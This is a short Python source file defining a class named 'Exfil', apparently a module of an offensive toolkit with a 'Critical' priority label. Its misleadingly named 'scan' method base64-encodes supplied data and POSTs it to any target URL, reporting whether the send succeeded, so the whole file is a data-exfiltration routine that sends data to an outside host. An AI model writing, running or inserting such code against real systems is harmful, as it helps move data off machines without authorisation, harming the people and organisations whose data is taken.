import requests
import base64

class Exfil:
    def __init__(self, engine):
        self.engine = engine
        self.priority = "P1"
        self.level = "Critical"

    def scan(self, target, data, method="http"):
        if method == "http":
            try:
                resp = requests.post(target, data={'data': base64.b64encode(data.encode()).decode()})
                return {"status": "sent", "response": resp.status_code}
            except Exception as e:
                return {"status": "failed", "error": str(e)}
        return {"status": "invalid_method"}
